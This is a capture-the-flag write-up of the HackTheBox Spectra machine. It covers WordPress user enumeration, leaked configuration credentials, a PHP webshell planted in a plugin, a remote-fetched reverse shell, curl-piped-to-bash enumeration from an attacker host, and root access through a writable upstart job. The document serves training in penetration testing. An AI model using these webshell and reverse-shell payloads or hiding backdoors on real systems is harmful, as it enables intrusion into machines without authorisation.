## >> INTRO

_Aaaaaaaaaaaaaand we're back!_ Hello friends, today we'll be throwing some hands with the [Spectra box on HTB](https://app.hackthebox.eu/machines/Spectra) - this box was a fun mix of configuration errors that ultimately lead us to full compromise on the host machine! We start by exploring a Wordpress install that has two setups - both a test environment and a production environment - and then move on to get a shell via editing plugins. From there we make our way through the upstart daemon to receive a full reverse shell - let's get to it!

## >> INTRUDER ALERT, INTRUDER ALERT

One of the first things I do to be lazy is add in the box and its IP to my `/etc/hosts` file. If you need help with this, [here's a pretty good explanation for you](https://library.netapp.com/ecmdocs/ECMP1155586/html/GUID-E306A314-D30E-4ACB-827E-1925A1368DD0.html). Make sure to drill down into the sub-article on [how to add a host name in the /etc/hosts file](https://library.netapp.com/ecmdocs/ECMP1155586/html/GUID-DBF81E5C-CF3C-4B07-AF01-83A625F2B4BF.html) as well to get the whole picture.

Next up we fire off our `nmap` scan. I've trimmed out a lot of extra information that isn't really relevant to this box. Running `nmap -sCV -O -oA tcp-full -p- -v spectra.htb` provides us this:

```

So like a lot of the other boxes, we have access to very few ports - SSH, HTTP, and MySQL in this case. Generally websites have the largest attack surface (and potential for mistakes), so we'll start with that. Browsing to `http://spectra.htb` shows us the following page:

![Visiting the homepage of the box.](/assets/images/spectra/index.png)

That's interesting  - they've indicated that they have a "main" page and a "testing" page. Let's start by poking around in `main` and then work our way back around to `testing`. If you browse around the main page much, you'll notice there's nothing there - it's a default Wordpress install! That doesn't mean it's _completely_ worthless, though... if you check out the post on the main branch, you'll notice that there's an author attached.

![Noticing that the main page of the site has a username listed.](/assets/images/spectra/web_main.png)

So this is a little trick I learned from watching ippsec's videos - click through to the administrator profile page at `http://spectra.htb/main?author=1`. See that `?author=1` that's tacked on to the end there? We can use that to enumerate potential user accounts. You _could_ just do it yourself if you want - just change the parameter to `author=` and a number - but who wants to do that? If there's one thing we are here, it's _supremely friggin lazy_. Let's lazi-fy this enum brute-force by using Burp Intruder.

![Matt Leblanc saying that his favorite thing to do is nothing.](/assets/images/spectra/lazy.gif)

To start you'll want to capture the request to the administrator account page in BurpSuite (either by intercepting the request _or_ by seeing it in the HTTP History tab). Once you have the request somewhere, right-click on it and choose "Send to Intruder". Change to the Positions tab inside of Intruder and clear all of the payload positions that it chooses by default, then set the payload position around the `1` in `?author=1`. It should look like this if you've done it correctly:

![Setting up the payload position in Burp Suite.](/assets/images/spectra/wp_enum_users_1.png)

Next jump over to the Payloads tab of Intruder - this is where we tell Intruder what kind of data we'd like to send over the wire to the server. For the current situation, it would be best to use the payload type of "Numbers" - you can use this one to generate either sequential or random number data. It's very useful when you think that a user-controlled parameter might be increasing incrementally in some fashion. Here's how I set up my payload options...

![Setting the "Numbers" payload type and payload options in Burp Suite Intruder.](/assets/images/spectra/wp_enum_users_2.png)

Finally, we click the "Start Attack" button in the top-right side of the Intruder window. If everything is correct you'll see Burp Suite begin to iterate over the numbers we've provided (in this case starting at 1 and going until it reaches 30). To keep an eye on progress monitor the orange bar at the bottom of the Intruder Attack window. Once everything is said and done, you should see results for only 1 account - `administrator` at `?author=1`.

![Viewing the results of the Burp Suite Intruder attack.](/assets/images/spectra/wp_enum_users_3.png)

It's unfortunate that we've only _just_ gotten one account - but it's still worth doing in case we were able to discover multiple. Oh well, back to the drawing board - to `http://spectra.htb/testing/index.php` we go!

## >> WHAT A SAVE! WHAT A SAVE! CHAT DISABLED FOR 3 SECONDS.

On browsing to `http://spectra.htb/testing/index.php`, we get something far less interesting - we only see that there's a "Database connection error" like this:

![Testing's index page showing that there's a database error.](/assets/images/spectra/web_testing_index.png)

Other than giving a small glimpse into a _tiny_ piece of Wordpress branding - I could tell by the font and the way the shadows are on the text box - we don't see a lot. That's...frustrating, to say the least. What to do? Well, if we try browsing around, we'll discover that directory listing is enabled on `http://spectra.htb/testing/` and that it spits out a rather _interesting_ file down the file list:

![Directory listing enabled shows us a wp-config.php.save file.](/assets/images/spectra/web_testing_wp_config_save.png)

If you're unaware, [wp-config.php holds a wealth of information](https://wordpress.org/support/article/editing-wp-config-php/) on what your site has connections to - this often holds things like database credentials inside of it! Normally we wouldn't be able to see this file as the browser tries to render PHP, but since it has the `.php.save` extension if we _view the page source_ we might be able to see inside of it! Trying this nets us a good set of credentials:

![Viewing the source code of wp-config.php.save in our browser shows us credentials.](/assets/images/spectra/web_testing_wp_config_save_creds.png)

The next natural step is to go back to `http://spectra.htb/main/wp-login.php` and try to login with them - good thing we did account enumeration earlier! If we try the password `devteam01` paired up with `administrator` we get a hit and are logged in. Bingo!

![Some kind of '90s rave. I'm not really sure what's happening here, but they're dancing erratically.](/assets/images/spectra/rave.gif)

If you've spent any time around Wordpress you'll know that one of the cool features of Wordpress is the ability to [add plugins to the site](https://wordpress.org/plugins/) to add functionality after-the-fact. There are plenty of positive use cases for these plugins such as enabling [spam blockers](https://wordpress.org/plugins/akismet/) and [two-factor authentication](https://wordpress.org/plugins/two-factor/), but for our purposes we're going to focus on the ability to _edit_ the plugins that are already installed. Since Wordpress is built on PHP we can insert a backdoor into one of the existing plugins and then turn it into a reverse shell!

Starting this, find the "Plugins" link on the left-side pane of the administration panel. Hover the link and once the sub-menus pop up select "Plugin Editor". This should, by default, take you to Akismet (the anti-spam blocker mentioned earlier). You _can_ edit _Akismet_, but as it's a large file with lots of functionality, I always choose to backdoor the plugin _Hello Dolly_. It's much simpler and has less lines of code - remember that for a real engagement, whatever back door we place needs to A) not disrupt the regular operations and B) be in a place that's less likely to be inspected. Most of my reasoning for picking _Hello Dolly_ hinges on A because less lines of code = less chances to accidentally break something.

Once _Hello Dolly_ is open in the editor, we add in the following to sneak a webshell in:

```php
echo system($_REQUEST['cmd']);
```

Fantastic. Click "Update File" to commit your changes. Once the page refreshes, we'll open a new tab and navigate to our hidden webshell. To do this, navigate to `http://spectra.htb/main/wp-content/plugins/hello.php`. This should produce some errors - not to worry. Add on our parameter from the webshell (`?cmd=`), pass in a command, and viola we know the result of `whoami`:

![Running the whoami command in our webshell.](/assets/images/spectra/webshell_whoami.png)

And just like that, we have code execution. This isn't particularly easy to work in, though, so let's get ourselves a full reverse shell. Copy the pentestmonkey PHP reverse shell to your local directory in Kali like so: `cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php`. Once that's moved locally, edit `shell.php` to include your IP address and preferred port for your listener. Fire up a Python dev server to serve up files (`python3 -m http.server 80`) and then use our webshell to download the file to Spectra (`http://spectra.htb/main/wp-content/plugins/hello.php?cmd=wget+http://10.10.17.239/shell.php`). Start up your `netcat` listener with `ncat -lvp 9001` and _finally_ trigger the reverse shell by browsing to `http://spectra.htb/main/wp-content/plugins/shell.php`.

Now we have our shell as `nginx` - almost there! To get into a user account, we need to do a bit more enumeration to determine both _who_ we're trying to get into and the possible _how_ to get into the account. Starting with the who, checking `/etc/passwd` reveals the following user accounts (among many system accounts):

```
nginx:x:20155:20156::/home/nginx:/bin/bash
katie:x:20156:20157::/home/katie:/bin/bash
```

How you proceed from here can vary from person to person - my workflow is usually to get into hiding somewhere in `/tmp` and make a folder for my beachhead. In this case `curl` is installed at `/usr/local/bin/curl` so I ran [LinPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) to take care of a lot of the manual enumeration for me. To do this, I ran a webserver where I keep linPEAS (`python3 -m http.server 80`) and then used this command: `curl http://10.10.17.239/linpeas.sh | bash | tee linpeas.txt`. Poke through some of the output and you should notice something odd here:

![LinPEAS detecting some autologin files.](/assets/images/spectra/linpeas_autologin.png)

Take a look at the file in question by running `cat /etc/autologin/passwd` and you'll be rewarded with a password of `SummerHereWeCome!!`. Given the only other account on the box is Katie's, SSH in with that username and password combination. Success!

## >> MAJOR TOM TO INIT CONTROL

Now that _that's_ out of the way, let's start the process of privilege escalation. On Linux boxes I _always_ check the output of `sudo -l` in case there are any easy wins - in this case there absolutely is. Running that tells us that katie has NOPASSWD access to run `/sbin/initctl`. What the...what is _initctl?_

Okay, crash course time on [upstart, what it is, etc](https://www.digitalocean.com/community/tutorials/the-upstart-event-system-what-it-is-and-how-to-use-it). And _no, before you ask,_ it is _NOT_ like updog. When Linux kickstarts itself in the morning (or more accurately, when you start it) it has a few things it has to do to get fully set up. From the linked article, they are:

1. The server boots itself.
2. The `init` process runs.
3. A set of startup tasks all run in sequence.

This sequence makes sure everything is square before it needs to turn over control to the server's regular purposes. The problem with this is that if there's a configuration change - you hot-swap a hard disk in, say - the server won't recognize it and you'd have to restart everything. This is where upstart and `initctl` come into play - they let us change things on the fly. That's about all we need to know about that, though - now let's look at what it _does_.

Skipping farther into the article, it mentions that jobs for `initctl` are stored at `/etc/init/job.conf`. Going there on Spectra shows us lots of files - with a keen eye, however, you'll notice that there are a series of jobs labeled `test*.conf`. Let's look at the first one - `test`. First, I checked the file permissions on the file with an `ls -la`:

![/etc/init/test.conf file permissions checked with ls.](/assets/images/spectra/linpeas_autologin.png)

If you look carefully, you'll notice that the file is writable by the `developers` group, which katie is a part of. This will enable us to overwrite this configuration with our own malicious one 😈 Next I wanted to see the file structure. Check it with `cat /etc/init/test.conf`:

```bash
$ cat test.conf
description "Test node.js server"
author      "katie"

start on filesystem or runlevel [2345]
stop on shutdown

script

    export HOME="/srv"
    echo $$ > /var/run/nodetest.pid
    exec /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js

end script

pre-start script
    echo "[`date`] Node Test Starting" >> /var/log/nodetest.log
end script

pre-stop script
    rm /var/run/nodetest.pid
    echo "[`date`] Node Test Stopping" >> /var/log/nodetest.log
end script
```

Neat, these are essentially weird-looking bash scripts. Inside of the `script` block we notice that there's an `exec` command that points to the node binary; putting two and two together, we figure out that if we run this job via `sudo`, the exec'd command will be executed as root. Now all that's left is to set up a reverse shell, edit `test.conf`, set up a listener, and trigger it. I created a file `/tmp/rev.php` with the following contents:

```php
<?php $sock=fsockopen("10.10.17.239",9001);exec("/bin/sh -i <&3 >&3 2>&3"); ?>
```

Now that our reverse shell is set, we need to find the absolute path to the PHP executable. A `which php` shows us the binary lives at `/usr/local/bin/php` - good deal. Now we have what we need to change `test.conf` in order to execute code. Let's finish this out with the following steps:

* Add in the following line to `/etc/init/test.conf` :: `exec /usr/local/bin/php /tmp/rev.php`. It can go in between the lines `echo $$ > /var/run/nodetest.pid` and `exec /usr/local/share/nodebrew/node/v8.9.4/bin/node /srv/nodetest.js`.
* Set up a netcat listener in a new tmux pane :: `ncat -lvp 9001`
* Trigger the config change :: `sudo -u root /sbin/initctl start test`

If all goes according to [my evil plan to save the world](https://www.youtube.com/watch?v=Dyne7jtuKr8), you should have a pretty reverse shell as root sitting in your netcat pane!

## >> OH I'M SORRY, DID I BREAK YOUR CONCENTRATION?

_We made it! It's over! I can stop listening to this idiot!_ I hear you say. If we're being honest, it may be for the best this way. I've been teaching you things like stealing configs, hijacking autologon credentials, and abusing `initctl` for personal gain, fame, and fortune! I hope you've enjoyed this post, I learned quite the neat trick on initctl from playing this box - as always, ~~make sure to like and subscribe~~ keep on keeping on and happy hacking!

## >> TL;DR FOR MY EFFICIENT FRIENDS

These were my short-form notes in Obsidian while doing the box.

```
# Steps
1. Visit web server, see main and testing pages
	1. `http://spectra.htb/main/index.php` - main
	2. `http://spectra.htb/testing/index.php` - testing
2. Browse around testing, find `wp-config.php.save`
	1. View source of page, find DB creds
3. Login to main branch with `Administrator :: devteam01`
4. Plugin edit to add webshell
	1. Sidebar > Plugins > Plugin Editor
	2. Top right in "Select plugin to edit", change to "Hello Dolly" and click Select
	3. Inside of PHP tag, add `echo system($_REQUEST['cmd']);`
6. `cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php`
7. Edit pentestmonkey PHP revshell with correct IP, port info
9. Use webshell to download `shell.php` from us
	1. `http://spectra.htb/main/wp-content/plugins/hello.php?cmd=whoami` to test shell works
	2. Set up python webserver where `shell.php` is on Kali: `python3 -m http.server 80`
	3. `http://spectra.htb/main/wp-content/plugins/hello.php?cmd=wget http://10.10.17.239/shell.php` to download shell
	4. Set up netcat listener: `ncat -lvp 9001`
	5. Browse to `http://spectra.htb/main/wp-content/plugins/shell.php` to trigger revshell
	6. Netcat listener should have a connection from spectra.htb
10. Run linpeas, find `/etc/autologin/passwd` from output
	1. `cat /etc/autologin/passwd` to find a password
11. ssh in as `katie :: SummerHereWeCome!!`
12. user.txt
13. `sudo -l` to see that  katie can run `/sbin/initctl`
14. `sudo -u root /sbin/initctl list` to see what jobs are available, find some `test` jobs in the output
15. Navigate to `/etc/init` to find the scripts that apply to test*.conf
	1. See the original script format: `cat /etc/init/test.conf`
	2. Check file permissions on `/etc/init/test.conf` - notice that `developers` can write to it
16. Get revshell as root:
	1. Create `/tmp/rev.php` with PHP revshell contents
	2. Edit `/etc/init/test.conf` to add `exec /usr/local/bin/php /tmp/rev.php`
	3. Set up netcat listener: `ncat -lvp 9001`
	4. `sudo -u root /sbin/initctl start test`
17. root.txt
```
